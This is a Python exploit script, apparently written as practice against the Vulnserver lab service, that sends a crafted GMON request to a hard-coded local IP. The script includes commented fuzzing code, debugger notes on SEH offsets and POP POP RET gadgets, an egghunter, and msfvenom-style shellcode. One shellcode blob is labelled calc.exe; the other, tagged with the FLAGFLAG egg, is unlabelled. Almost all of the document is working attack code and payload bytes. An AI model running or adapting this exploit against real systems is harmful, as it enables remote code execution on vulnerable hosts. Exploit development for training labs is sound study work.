
# FUZZING RESULTS

#from boofuzz import * 

#   session = Session(target=Target(
#    connection=SocketConnection("192.168.0.106",9999,proto='tcp')))

#s_initialize("GMON")
#s_static("GMON ")
#s_string("AAAA")

#session.connect(s_get("GMON"))
#session.fuzz()


import socket 


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('192.168.0.106',9999))

msg = s.recv(2048).decode()
print(msg)


#   00B6FFDC   616F4C4B  KLoa  Pointer to next SEH record nseh  3431
#   00B6FFE0   68664F4A  JOfh  SE handler  seh          3435

#   \xeb\0xb0    jumping back from nseh to 'A' s 


#   7C901931  |> 5E             POP ESI
#   7C901932  |. 5B             POP EBX
#   7C901933  \. C3             RETN


#    6250127A   5E               POP ESI
#   6250127B   5D               POP EBP
#   6250127C   C3               RETN




pattern = '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'

#egghunter searches for shellcode and executes it 
egghunter ="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"+"\xef\xb8\x46\x4c\x41\x47\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
egglength = len(egghunter)

#   msfvenom -p windows/exec cmd=calc.exe -b '\x00\x0a\x0d' -f c 
shellcode = ("\xda\xc0\xba\x35\x2b\x95\x08\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x31\x31\x57\x18\x03\x57\x18\x83\xc7\x31\xc9\x60\xf4\xd1\x8f"
"\x8b\x05\x21\xf0\x02\xe0\x10\x30\x70\x60\x02\x80\xf2\x24\xae"
"\x6b\x56\xdd\x25\x19\x7f\xd2\x8e\x94\x59\xdd\x0f\x84\x9a\x7c"
"\x93\xd7\xce\x5e\xaa\x17\x03\x9e\xeb\x4a\xee\xf2\xa4\x01\x5d"
"\xe3\xc1\x5c\x5e\x88\x99\x71\xe6\x6d\x69\x73\xc7\x23\xe2\x2a"
"\xc7\xc2\x27\x47\x4e\xdd\x24\x62\x18\x56\x9e\x18\x9b\xbe\xef"
"\xe1\x30\xff\xc0\x13\x48\xc7\xe6\xcb\x3f\x31\x15\x71\x38\x86"
"\x64\xad\xcd\x1d\xce\x26\x75\xfa\xef\xeb\xe0\x89\xe3\x40\x66"
"\xd5\xe7\x57\xab\x6d\x13\xd3\x4a\xa2\x92\xa7\x68\x66\xff\x7c"
"\x10\x3f\xa5\xd3\x2d\x5f\x06\x8b\x8b\x2b\xaa\xd8\xa1\x71\xa0"
"\x1f\x37\x0c\x86\x20\x47\x0f\xb6\x48\x76\x84\x59\x0e\x87\x4f"
"\x1e\xe0\xcd\xd2\x36\x69\x88\x86\x0b\xf4\x2b\x7d\x4f\x01\xa8"
"\x74\x2f\xf6\xb0\xfc\x2a\xb2\x76\xec\x46\xab\x12\x12\xf5\xcc"
"\x36\x71\x98\x5e\xda\x58\x3f\xe7\x79\xa5")

shellcode = 'FLAGFLAG'
shellcode += ("\xdb\xcb\xd9\x74\x24\xf4\xb8\x06\xa5\x33\xda\x5a\x33\xc9\xb1"
"\x52\x31\x42\x17\x03\x42\x17\x83\xc4\xa1\xd1\x2f\x34\x41\x97"
"\xd0\xc4\x92\xf8\x59\x21\xa3\x38\x3d\x22\x94\x88\x35\x66\x19"
"\x62\x1b\x92\xaa\x06\xb4\x95\x1b\xac\xe2\x98\x9c\x9d\xd7\xbb"
"\x1e\xdc\x0b\x1b\x1e\x2f\x5e\x5a\x67\x52\x93\x0e\x30\x18\x06"
"\xbe\x35\x54\x9b\x35\x05\x78\x9b\xaa\xde\x7b\x8a\x7d\x54\x22"
"\x0c\x7c\xb9\x5e\x05\x66\xde\x5b\xdf\x1d\x14\x17\xde\xf7\x64"
"\xd8\x4d\x36\x49\x2b\x8f\x7f\x6e\xd4\xfa\x89\x8c\x69\xfd\x4e"
"\xee\xb5\x88\x54\x48\x3d\x2a\xb0\x68\x92\xad\x33\x66\x5f\xb9"
"\x1b\x6b\x5e\x6e\x10\x97\xeb\x91\xf6\x11\xaf\xb5\xd2\x7a\x6b"
"\xd7\x43\x27\xda\xe8\x93\x88\x83\x4c\xd8\x25\xd7\xfc\x83\x21"
"\x14\xcd\x3b\xb2\x32\x46\x48\x80\x9d\xfc\xc6\xa8\x56\xdb\x11"
"\xce\x4c\x9b\x8d\x31\x6f\xdc\x84\xf5\x3b\x8c\xbe\xdc\x43\x47"
"\x3e\xe0\x91\xc8\x6e\x4e\x4a\xa9\xde\x2e\x3a\x41\x34\xa1\x65"
"\x71\x37\x6b\x0e\x18\xc2\xfc\xf1\x75\xcc\x9a\x99\x87\xcc\x73"
"\x06\x01\x2a\x19\xa6\x47\xe5\xb6\x5f\xc2\x7d\x26\x9f\xd8\xf8"
"\x68\x2b\xef\xfd\x27\xdc\x9a\xed\xd0\x2c\xd1\x4f\x76\x32\xcf"
"\xe7\x14\xa1\x94\xf7\x53\xda\x02\xa0\x34\x2c\x5b\x24\xa9\x17"
"\xf5\x5a\x30\xc1\x3e\xde\xef\x32\xc0\xdf\x62\x0e\xe6\xcf\xba"
"\x8f\xa2\xbb\x12\xc6\x7c\x15\xd5\xb0\xce\xcf\x8f\x6f\x99\x87"
"\x56\x5c\x1a\xd1\x56\x89\xec\x3d\xe6\x64\xa9\x42\xc7\xe0\x3d"
"\x3b\x35\x91\xc2\x96\xfd\xa1\x88\xba\x54\x2a\x55\x2f\xe5\x37"
"\x66\x9a\x2a\x4e\xe5\x2e\xd3\xb5\xf5\x5b\xd6\xf2\xb1\xb0\xaa"
"\x6b\x54\xb6\x19\x8b\x7d")

junk = 'GMON ' + '/.:/' + shellcode + '\x90'*(3431-len(egghunter+shellcode)-20)

#aaah shit i forgot the egg


#jumping back 80 bytes 
nseh = '\xeb\xb0\x90\x90' 

#   6250127A  pop pop rets to nseh 
seh = '\x7A\x12\x50\x62'    
junk2 = 'D'*(5000-len(junk+nseh+seh)+9)

payload = junk + egghunter + 'A'*20 +  nseh + seh + junk2
payload = payload.encode('raw_unicode_escape')

s.send(payload)
s.close()

